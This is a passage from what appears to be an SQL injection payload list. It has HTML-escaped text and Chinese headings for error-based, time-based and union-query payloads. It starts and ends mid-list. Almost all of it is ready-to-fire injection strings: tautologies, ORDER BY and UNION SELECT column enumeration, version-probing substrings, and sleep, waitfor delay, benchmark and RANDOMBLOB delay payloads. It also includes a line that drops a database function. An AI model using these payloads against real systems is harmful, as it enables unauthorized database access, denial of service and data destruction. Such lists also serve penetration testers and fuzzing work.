--\n&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;UNION SELECT &#39;2\n%00\n&#x2F;*…*&#x2F; \n+    addition, concatenate (or space in url)\n||    (double pipe) concatenate\n%    wildcard attribute indicator\n\n@variable  local variable\n@@variable  global variable\n\n\n# Numeric\nAND 1\nAND 0\nAND true\nAND false\n1-false\n1-true\n1*56\n-2\n\n\n1&#39; ORDER BY 1--+\n1&#39; ORDER BY 2--+\n1&#39; ORDER BY 3--+\n\n1&#39; ORDER BY 1,2--+\n1&#39; ORDER BY 1,2,3--+\n\n1&#39; GROUP BY 1,2,--+\n1&#39; GROUP BY 1,2,3--+\n&#39; GROUP BY columnnames having 1&#x3D;1 --\n\n\n-1&#39; UNION SELECT 1,2,3--+\n&#39; UNION SELECT sum(columnname ) from tablename --\n\n\n-1 UNION SELECT 1 INTO @,@\n-1 UNION SELECT 1 INTO @,@,@\n\n1 AND (SELECT * FROM Users) &#x3D; 1  \n\n&#39; AND MID(VERSION(),1,1) &#x3D; &#39;5&#39;;\n\n&#39; and 1 in (select min(name) from sysobjects where xtype &#x3D; &#39;U&#39; and name &gt; &#39;.&#39;) --\n\n\nFinding the table name\n\n\nTime-Based:\n,(select * from (select(sleep(10)))a)\n%2c(select%20*%20from%20(select(sleep(10)))a)\n&#39;;WAITFOR DELAY &#39;0:0:30&#39;--\n\nComments:\n\n#      Hash comment\n&#x2F;*    C-style comment\n-- -  SQL comment\n;%00  Nullbyte\n&#96;      Backtick\n\n\n\n0x02 基于通用错误的有效负载\n OR 1&#x3D;1\n OR 1&#x3D;0\n OR x&#x3D;x\n OR x&#x3D;y\n OR 1&#x3D;1#\n OR 1&#x3D;0#\n OR x&#x3D;x#\n OR x&#x3D;y#\n OR 1&#x3D;1-- \n OR 1&#x3D;0-- \n OR x&#x3D;x-- \n OR x&#x3D;y-- \n OR 3409&#x3D;3409 AND (&#39;pytW&#39; LIKE &#39;pytW\n OR 3409&#x3D;3409 AND (&#39;pytW&#39; LIKE &#39;pytY\n HAVING 1&#x3D;1\n HAVING 1&#x3D;0\n HAVING 1&#x3D;1#\n HAVING 1&#x3D;0#\n HAVING 1&#x3D;1-- \n HAVING 1&#x3D;0-- \n AND 1&#x3D;1\n AND 1&#x3D;0\n AND 1&#x3D;1-- \n AND 1&#x3D;0-- \n AND 1&#x3D;1#\n AND 1&#x3D;0#\n AND 1&#x3D;1 AND &#39;%&#39;&#x3D;&#39;\n AND 1&#x3D;0 AND &#39;%&#39;&#x3D;&#39;\n AND 1083&#x3D;1083 AND (1427&#x3D;1427\n AND 7506&#x3D;9091 AND (5913&#x3D;5913\n AND 1083&#x3D;1083 AND (&#39;1427&#x3D;1427\n AND 7506&#x3D;9091 AND (&#39;5913&#x3D;5913\n AND 7300&#x3D;7300 AND &#39;pKlZ&#39;&#x3D;&#39;pKlZ\n AND 7300&#x3D;7300 AND &#39;pKlZ&#39;&#x3D;&#39;pKlY\n AND 7300&#x3D;7300 AND (&#39;pKlZ&#39;&#x3D;&#39;pKlZ\n AND 7300&#x3D;7300 AND (&#39;pKlZ&#39;&#x3D;&#39;pKlY\n AS INJECTX WHERE 1&#x3D;1 AND 1&#x3D;1\n AS INJECTX WHERE 1&#x3D;1 AND 1&#x3D;0\n AS INJECTX WHERE 1&#x3D;1 AND 1&#x3D;1#\n AS INJECTX WHERE 1&#x3D;1 AND 1&#x3D;0#\n AS INJECTX WHERE 1&#x3D;1 AND 1&#x3D;1--\n AS INJECTX WHERE 1&#x3D;1 AND 1&#x3D;0--\n WHERE 1&#x3D;1 AND 1&#x3D;1\n WHERE 1&#x3D;1 AND 1&#x3D;0\n WHERE 1&#x3D;1 AND 1&#x3D;1#\n WHERE 1&#x3D;1 AND 1&#x3D;0#\n WHERE 1&#x3D;1 AND 1&#x3D;1--\n WHERE 1&#x3D;1 AND 1&#x3D;0--\n ORDER BY 1-- \n ORDER BY 2-- \n ORDER BY 3-- \n ORDER BY 4-- \n ORDER BY 5-- \n ORDER BY 6-- \n ORDER BY 7-- \n ORDER BY 8-- \n ORDER BY 9-- \n ORDER BY 10-- \n ORDER BY 11-- \n ORDER BY 12-- \n ORDER BY 13-- \n ORDER BY 14-- \n ORDER BY 15-- \n ORDER BY 16-- \n ORDER BY 17-- \n ORDER BY 18-- \n ORDER BY 19-- \n ORDER BY 20-- \n ORDER BY 21-- \n ORDER BY 22-- \n ORDER BY 23-- \n ORDER BY 24-- \n ORDER BY 25-- \n ORDER BY 26-- \n ORDER BY 27-- \n ORDER BY 28-- \n ORDER BY 29-- \n ORDER BY 30-- \n ORDER BY 31337-- \n ORDER BY 1# \n ORDER BY 2# \n ORDER BY 3# \n ORDER BY 4# \n ORDER BY 5# \n ORDER BY 6# \n ORDER BY 7# \n ORDER BY 8# \n ORDER BY 9# \n ORDER BY 10# \n ORDER BY 11# \n ORDER BY 12# \n ORDER BY 13# \n ORDER BY 14# \n ORDER BY 15# \n ORDER BY 16# \n ORDER BY 17# \n ORDER BY 18# \n ORDER BY 19# \n ORDER BY 20# \n ORDER BY 21# \n ORDER BY 22# \n ORDER BY 23# \n ORDER BY 24# \n ORDER BY 25# \n ORDER BY 26# \n ORDER BY 27# \n ORDER BY 28# \n ORDER BY 29# \n ORDER BY 30#\n ORDER BY 31337#\n ORDER BY 1 \n ORDER BY 2 \n ORDER BY 3 \n ORDER BY 4 \n ORDER BY 5 \n ORDER BY 6 \n ORDER BY 7 \n ORDER BY 8 \n ORDER BY 9 \n ORDER BY 10 \n ORDER BY 11 \n ORDER BY 12 \n ORDER BY 13 \n ORDER BY 14 \n ORDER BY 15 \n ORDER BY 16 \n ORDER BY 17 \n ORDER BY 18 \n ORDER BY 19 \n ORDER BY 20 \n ORDER BY 21 \n ORDER BY 22 \n ORDER BY 23 \n ORDER BY 24 \n ORDER BY 25 \n ORDER BY 26 \n ORDER BY 27 \n ORDER BY 28 \n ORDER BY 29 \n ORDER BY 30 \n ORDER BY 31337 \n RLIKE (SELECT (CASE WHEN (4346&#x3D;4346) THEN 0x61646d696e ELSE 0x28 END)) AND &#39;Txws&#39;&#x3D;&#39;\n RLIKE (SELECT (CASE WHEN (4346&#x3D;4347) THEN 0x61646d696e ELSE 0x28 END)) AND &#39;Txws&#39;&#x3D;&#39;\nIF(7423&#x3D;7424) SELECT 7423 ELSE DROP FUNCTION xcjl--\nIF(7423&#x3D;7423) SELECT 7423 ELSE DROP FUNCTION xcjl--\n%&#39; AND 8310&#x3D;8310 AND &#39;%&#39;&#x3D;&#39;\n%&#39; AND 8310&#x3D;8311 AND &#39;%&#39;&#x3D;&#39;\n and (select substring(@@version,1,1))&#x3D;&#39;X&#39;\n and (select substring(@@version,1,1))&#x3D;&#39;M&#39;\n and (select substring(@@version,2,1))&#x3D;&#39;i&#39;\n and (select substring(@@version,2,1))&#x3D;&#39;y&#39;\n and (select substring(@@version,3,1))&#x3D;&#39;c&#39;\n and (select substring(@@version,3,1))&#x3D;&#39;S&#39;\n and (select substring(@@version,3,1))&#x3D;&#39;X&#39;\n\n\n\n0x03 基于时间的通用 SQL 注入负载\nsleep(5)#\n1 or sleep(5)#\n&quot; or sleep(5)#\n&#39; or sleep(5)#\n&quot; or sleep(5)&#x3D;&quot;\n&#39; or sleep(5)&#x3D;&#39;\n1) or sleep(5)#\n&quot;) or sleep(5)&#x3D;&quot;\n&#39;) or sleep(5)&#x3D;&#39;\n1)) or sleep(5)#\n&quot;)) or sleep(5)&#x3D;&quot;\n&#39;)) or sleep(5)&#x3D;&#39;\n;waitfor delay &#39;0:0:5&#39;--\n);waitfor delay &#39;0:0:5&#39;--\n&#39;;waitfor delay &#39;0:0:5&#39;--\n&quot;;waitfor delay &#39;0:0:5&#39;--\n&#39;);waitfor delay &#39;0:0:5&#39;--\n&quot;);waitfor delay &#39;0:0:5&#39;--\n));waitfor delay &#39;0:0:5&#39;--\n&#39;));waitfor delay &#39;0:0:5&#39;--\n&quot;));waitfor delay &#39;0:0:5&#39;--\nbenchmark(10000000,MD5(1))#\n1 or benchmark(10000000,MD5(1))#\n&quot; or benchmark(10000000,MD5(1))#\n&#39; or benchmark(10000000,MD5(1))#\n1) or benchmark(10000000,MD5(1))#\n&quot;) or benchmark(10000000,MD5(1))#\n&#39;) or benchmark(10000000,MD5(1))#\n1)) or benchmark(10000000,MD5(1))#\n&quot;)) or benchmark(10000000,MD5(1))#\n&#39;)) or benchmark(10000000,MD5(1))#\npg_sleep(5)--\n1 or pg_sleep(5)--\n&quot; or pg_sleep(5)--\n&#39; or pg_sleep(5)--\n1) or pg_sleep(5)--\n&quot;) or pg_sleep(5)--\n&#39;) or pg_sleep(5)--\n1)) or pg_sleep(5)--\n&quot;)) or pg_sleep(5)--\n&#39;)) or pg_sleep(5)--\nAND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND &#39;vRxe&#39;&#x3D;&#39;vRxe\nAND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND &#39;%&#39;&#x3D;&#39;\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#\nSLEEP(5)#\nSLEEP(5)--\nSLEEP(5)&#x3D;&quot;\nSLEEP(5)&#x3D;&#39;\nor SLEEP(5)\nor SLEEP(5)#\nor SLEEP(5)--\nor SLEEP(5)&#x3D;&quot;\nor SLEEP(5)&#x3D;&#39;\nwaitfor delay &#39;00:00:05&#39;\nwaitfor delay &#39;00:00:05&#39;--\nwaitfor delay &#39;00:00:05&#39;#\nbenchmark(50000000,MD5(1))\nbenchmark(50000000,MD5(1))--\nbenchmark(50000000,MD5(1))#\nor benchmark(50000000,MD5(1))\nor benchmark(50000000,MD5(1))--\nor benchmark(50000000,MD5(1))#\npg_SLEEP(5)\npg_SLEEP(5)--\npg_SLEEP(5)#\nor pg_SLEEP(5)\nor pg_SLEEP(5)--\nor pg_SLEEP(5)#\n&#39;\\&quot;\nAnD SLEEP(5)\nAnD SLEEP(5)--\nAnD SLEEP(5)#\n&amp;&amp;SLEEP(5)\n&amp;&amp;SLEEP(5)--\n&amp;&amp;SLEEP(5)#\n&#39; AnD SLEEP(5) ANd &#39;1\n&#39;&amp;&amp;SLEEP(5)&amp;&amp;&#39;1\nORDER BY SLEEP(5)\nORDER BY SLEEP(5)--\nORDER BY SLEEP(5)#\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--\n+benchmark(3200,SHA1(1))+&#39;\n+ SLEEP(10) + &#39;\nRANDOMBLOB(500000000&#x2F;2)\nAND 2947&#x3D;LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(500000000&#x2F;2))))\nOR 2947&#x3D;LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(500000000&#x2F;2))))\nRANDOMBLOB(1000000000&#x2F;2)\nAND 2947&#x3D;LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(1000000000&#x2F;2))))\nOR 2947&#x3D;LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(1000000000&#x2F;2))))\nSLEEP(1)&#x2F;*&#39; or SLEEP(1) or &#39;&quot; or SLEEP(1) or &quot;*&#x2F;\n\n\n\n0x04 通用联合查询有效负载ORDER BY SLEEP(5)\nORDER BY 1,SLEEP(5)\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;))\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\nORDER BY SLEEP(5)#\nORDER BY 1,SLEEP(5)#\nORDER BY 1,SLEEP(5),3#\nORDER BY 1,SLEEP(5),3,4#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\nORDER BY SLEEP(5)-- \nORDER BY 1,SLEEP(5)-- \nORDER BY 1,SLEEP(5),3-- \nORDER BY 1,SLEEP(5),3,4-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \nUNION ALL SELECT 1\nUNION ALL SELECT 1,2\nUNION ALL SELECT 1,2,3\nUNION ALL SELECT 1,2,3,4\nUNION ALL SELECT 1,2,3,4,5\nUNION ALL SELECT 1,2,3,4,5,6\nUNION ALL SELECT 1,2,3,4,5,6,7\nUNION ALL SELECT 1,2,3,4,5,6,7,8\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\nUNION ALL SELECT 1#\nUNION ALL SELECT 1,2#\nUNION ALL SELECT 1,2,3#\nUNION ALL SELECT 1,2,3,4#\nUNION ALL SELECT 1,2,3,4,5#\nUNION ALL SELECT 1,2,3,4,5,6#\nUNION ALL SELECT 1,2,3,4,5,6,7#\nUNION ALL SELECT 1,2,3,4,5,6,7,8#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\nUNION ALL SELECT 1-- \nUNION ALL SELECT 1,2-- \nUNION ALL SELECT 1,2,3-- \nUNION ALL SELECT 1,2,3,4-- \nUNION ALL SELECT 1,2,3,4,5-- \nUNION ALL SELECT 1,2,3,4,5,6-- \nUNION ALL SELECT 1,2,3,4,5,6,7-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- \nUNION ALL SELECT 